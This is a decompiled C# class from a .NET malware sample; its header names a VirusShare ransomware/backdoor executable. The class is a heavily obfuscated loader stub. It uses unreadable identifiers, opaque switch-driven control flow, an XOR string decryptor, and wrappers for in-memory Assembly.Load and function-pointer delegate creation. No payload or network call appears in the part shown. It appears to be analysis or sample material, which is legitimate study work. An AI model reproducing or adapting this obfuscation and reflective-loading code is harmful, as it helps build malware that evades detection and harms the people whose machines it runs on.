// Decompiled with JetBrains decompiler
// Type: stub.My.MyApplication
// Assembly: stub, Version=6.2.15.2, Culture=neutral, PublicKeyToken=null
// MVID: 6CAE2B56-3E3C-414E-A63C-DF5759216B41
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\HEUR-Backdoor.Win32.Generic-096e6b097e27c58c2df14c5e158c75d47cc6916069c8924d0ff712617061c5e0.exe

using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Configuration;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Policy;
using System.Windows.Forms;

namespace stub.My
{
  [GeneratedCode("MyTemplate", "8.0.0.0")]
  [EditorBrowsable(EditorBrowsableState.Never)]
  internal sealed class MyApplication : ConsoleApplicationBase
  {
    private static readonly char[] ႤႠ;
    private static readonly char[] ႤႤ = new char[8]
    {
      char.MinValue,
      '\u0005',
      char.MinValue,
      '\u1C97',
      '⣒',
      '㛦',
      'マ',
      '\u202D'
    };
    private static readonly string[] ႤႣ;
    internal static MyApplication.ႤႨ ႤႰ;

    static MyApplication()
    {
      char[] chArray = new char[8]
      {
        char.MinValue,
        char.MinValue,
        char.MinValue,
        char.MinValue,
        '\u206F',
        char.MinValue,
        char.MinValue,
        char.MinValue
      };
      chArray[1] = '⣧';
      chArray[3] = 'ョ';
      chArray[0] = '\u1CBA';
      chArray[6] = '࠻';
      chArray[7] = '\u0B12';
      chArray[2] = '㛗';
      chArray[5] = 'ⵂ';
      MyApplication.ႤႣ = new string[1];
      MyApplication.ႤႠ = chArray;
      Ⴐ.Ⴈ.Ⴃ();
    }

    internal static SettingsBase Ⴀ([In] SettingsBase obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 55:
          num1 = 2;
          break;
        default:
          num1 = 5;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 5:
          case 7:
            num2 = 6;
            continue;
          case 1:
          case 6:
            goto label_3;
          case 2:
            goto label_8;
          case 4:
            num2 = 6;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (MyApplication.Ⴀ);
            num2 = 6;
            continue;
        }
      }
label_8:
      return SettingsBase.Synchronized(obj0);
    }

    internal static Assembly Ⴄ([In] System.Type obj0, [In] int obj1, [In] int obj2)
    {
label_3:
      int num1;
      switch (obj2 ^ obj1)
      {
        case 95:
          num1 = 6;
          break;
        default:
          num1 = 4;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 6:
            goto label_8;
          case 1:
          case 3:
            num2 = 2;
            continue;
          case 2:
            goto label_3;
          case 4:
          case 5:
            num2 = 2;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (MyApplication.Ⴄ);
            num2 = 2;
            continue;
        }
      }
label_8:
      return obj0.Assembly;
    }

    internal static Array Ⴃ([In] Array obj0, [In] Array obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 54:
          num1 = 2;
          break;
        default:
          num1 = 4;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 2:
          case 5:
            goto label_8;
          case 3:
            num2 = 7;
            continue;
          case 4:
            num2 = 7;
            continue;
          case 7:
            goto label_3;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (MyApplication.Ⴃ);
            num2 = 7;
            continue;
        }
      }
label_8:
      return Utils.CopyArray(obj0, obj1);
    }

    internal static Delegate Ⴈ([In] IntPtr obj0, [In] System.Type obj1, [In] int obj2, [In] int obj3)
    {
label_3:
      int num1;
      switch (obj3 ^ obj2)
      {
        case 3:
          num1 = 3;
          break;
        default:
          num1 = 2;
          break;
      }
      int num2 = num1;
      while (true)
      {
        switch (num2)
        {
          case 0:
          case 1:
            goto label_3;
          case 2:
            num2 = 0;
            continue;
          case 3:
          case 5:
            goto label_8;
          case 7:
            num2 = 0;
            continue;
          default:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle = __methodref (MyApplication.Ⴈ);
            num2 = 0;
            continue;
        }
      }
label_8:
      return Marshal.GetDelegateForFunctionPointer(obj0, obj1);
    }

    internal static void Ⴐ([In] Control obj0, [In] string obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 0;
      while (true)
      {
        switch (num1)
        {
          case 1:
          case 2:
          case 3:
          case 5:
            num1 = 0;
            continue;
          case 4:
            goto label_7;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 6:
                num2 = 4;
                break;
              default:
                num2 = 5;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_7:
      obj0.Name = obj1;
    }

    internal static void Ⴓ(
      [In] Array obj0,
      [In] int obj1,
      [In] Array obj2,
      [In] int obj3,
      [In] int obj4,
      [In] int obj5,
      [In] int obj6)
    {
      int num1 = 2;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 3:
          case 4:
            num1 = 2;
            continue;
          case 1:
          case 5:
            goto label_7;
          default:
            int num2;
            switch (obj6 ^ obj5)
            {
              case 18:
                num2 = 1;
                break;
              default:
                num2 = 0;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_7:
      Buffer.BlockCopy(obj0, obj1, obj2, obj3, obj4);
    }

    internal static void Ⴍ([In] Control obj0, [In] Size obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 2;
      while (true)
      {
        switch (num1)
        {
          case 1:
            goto label_7;
          case 3:
          case 4:
          case 5:
            num1 = 2;
            continue;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 28:
                num2 = 1;
                break;
              default:
                num2 = 4;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_7:
      obj0.Size = obj1;
    }

    internal static void Ⴗ([In] Control obj0, [In] int obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 0;
      while (true)
      {
        switch (num1)
        {
          case 1:
          case 2:
          case 3:
            goto label_7;
          case 4:
            num1 = 0;
            continue;
          case 5:
            goto label_8;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 11:
                num2 = 2;
                break;
              default:
                num2 = 4;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_8:
      return;
label_7:
      obj0.TabIndex = obj1;
    }

    internal static void Ⴅ([In] ButtonBase obj0, [In] bool obj1, [In] int obj2, [In] int obj3)
    {
      int num1 = 1;
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_7;
          case 2:
          case 3:
          case 5:
            num1 = 1;
            continue;
          case 4:
            goto label_8;
          default:
            int num2;
            switch (obj3 ^ obj2)
            {
              case 42:
                num2 = 0;
                break;
              default:
                num2 = 5;
                break;
            }
            num1 = num2;
            continue;
        }
      }
label_8:
      return;
label_7:
      obj0.UseVisualStyleBackColor = obj1;
    }

    internal static string Ⴜ([In] int obj0, [In] int obj1)
    {
      int index1 = obj0 ^ 437501334 ^ obj1;
      char[] ⴄⴄ = MyApplication.ႤႤ;
      int index2 = (int) ⴄⴄ[index1];
      string str1;
      if ((str1 = MyApplication.ႤႣ[index2]) != null)
        return str1;
      int num1 = (int) ⴄⴄ[index1 + 1];
      int length1 = ((int) ⴄⴄ[index1 + 2] << 16) + num1;
      char[] chArray = new char[length1];
      char[] ⴄⴀ = MyApplication.ႤႠ;
      int length2 = ⴄⴀ.Length;
      int num2 = index1 + 3;
      for (int index3 = 0; index3 < length1; index3 = 1 + index3)
        chArray[index3] = (char) ((uint) ⴄⴄ[num2 + index3] ^ (uint) ⴄⴀ[(index3 + index2) % length2]);
      string str2 = new string(chArray);
      MyApplication.ႤႣ[index2] = str2;
      return str2;
    }

    internal static void ႤႳ([In] Stream obj0, [In] byte[] obj1, [In] int obj2, [In] int obj3, [In] int obj4, [In] int obj5)
    {
label_0:
      switch ((obj5 ^ obj4) - 87)
      {
        case 0:
          obj0.Write(obj1, obj2, obj3);
          break;
        default:
          goto label_0;
      }
    }

    internal static Assembly ႤႭ(
      [In] byte[] obj0,
      [In] byte[] obj1,
      [In] Evidence obj2,
      [In] int obj3,
      [In] int obj4)
    {
label_0:
      switch ((obj4 ^ obj3) - 55)
      {
        case 0:
          return Assembly.Load(obj0, obj1, obj2);
        default:
          goto label_0;
      }
    }

    [StructLayout(LayoutKind.Explicit, Size = 16, Pack = 1)]
    private struct ႤႨ
    {
    }
  }
}
